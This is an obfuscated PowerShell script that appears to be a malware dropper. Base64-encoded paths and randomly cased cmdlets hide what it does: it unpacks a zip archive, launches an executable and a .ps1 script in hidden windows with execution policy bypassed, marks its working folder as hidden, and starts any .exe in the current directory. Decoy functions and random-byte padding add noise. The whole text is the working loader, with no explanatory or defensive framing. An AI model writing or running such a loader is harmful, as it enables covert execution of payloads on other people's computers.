function lindaMakeHappen() {
    return (0.1111*9)+(0x111111+0xfffff*3)/(34.12+657.2134*0xfffff)+8.22
}

function lindaSaysIt() {
    return [Convert]::ToBase64String((0x1..0x40|%{[byte](Get-Random -Max 0x100)}))
}
function lindaMakePretty($s) {
    return [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($s))
}

function lindaGetSkinny() {
    $dirName = lindaMakePretty("LnJ1bl9kaXI=");
    if (Test-Path -Path "$dirName") {
        $headerSection=lindaMakeHappen;
        $byteSection=lindaSaysIt;
        return Format-hex -InputObject "$headerSection$byteSection"
    }
}

function lindaMakeDifferent() {
    $dirName=lindaMakePretty("Llx1bnppcHBlZA==");
    $zipName=lindaMakePretty("YS56aXA=");
    $makeDirName=lindaMakePretty("dW56aXBwZWQ=");
    mkdir $makeDirName;
    ExPaNd-ArChIvE -FOrCE -LiTERAlPATH "$zipName" -DEsTINAtIONPATH "$dirName"
}

function LindaMadeIt() {
    $dirName = lindaMakePretty("LlwuQXNEZWVERGZyXA==")
    $fileName = lindaMakePretty("bGluZGFzX2ZyaWVuZC5leGU=")
    $folderName = lindaMakePretty("dW56aXBwZWQ=")
    C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -EXecuTiONpoLICy bypASS STArT-PrOCEsS -FIlePATH "$dirName$fileName $folderName"
}

function lindaCantFindIt() {
    $dirName = lindaMakePretty("LlwucnVuX2Rpcg==");
    $fitlerName = lindaMakePretty("Ki5wczE=");
    return gET-cHiLDiTEm -PAtH "$dirName" -FiLTer "$fitlerName" -fiLE -NamE
}

function lindaFoundIt() {
    $pathName = lindaMakePretty("Lg==");
    $filterName = lindaMakePretty("Ki5leGU=");
    return gET-cHiLDiTEm -PAtH "$pathName" -FiLTer "$filterName" -fiLE -NamE
}

function lindaToTheMoon() {
    $dirName = lindaMakePretty("LlwucnVuX2Rpclw=")
    $attributeName = lindaMakePretty("SGlkZGVu")
    write-host $dirname;
    $runPath = lindaCantFindIt;
    Get-Item "$dirName" -Force | foreach { $_.Attributes = $_.Attributes -bor "$attributeName" }
    C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe  -WindowStyle hidden -EXecuTiONpoLICy bypASS -COmMANd "$dirName$runPath"
    $newestDownloadedFile = lindaFoundIt;
    C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe  -WindowStyle hidden -EXecuTiONpoLICy bypASS STArT-PrOCEsS -FIlePATH "$newestDownloadedFile"
}

lindaMakeDifferent;
LindaMadeIt;
start-sleep 1;
lindaGetSkinny;
lindaToTheMoon;